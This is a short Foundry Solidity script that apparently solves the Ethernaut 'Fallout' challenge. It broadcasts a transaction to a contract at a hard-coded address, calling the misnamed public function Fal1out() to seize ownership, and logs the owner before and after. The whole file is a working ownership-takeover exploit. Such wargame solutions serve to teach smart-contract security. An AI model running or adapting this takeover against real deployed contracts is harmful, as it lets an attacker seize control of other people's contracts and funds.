// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Fallout.sol";

contract FalloutScript is Script {

    Fallout public fallout = Fallout(0xc0f87bB1Da61b1Efd4e1F4fc59a6903A647e6f23);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("1. Current owner is", fallout.owner());
        // Since this Fal1out is not a constructor but a method everyone can call it
        fallout.Fal1out();
        console.log("2. New owner is", fallout.owner());
        vm.stopBroadcast();
    }
}
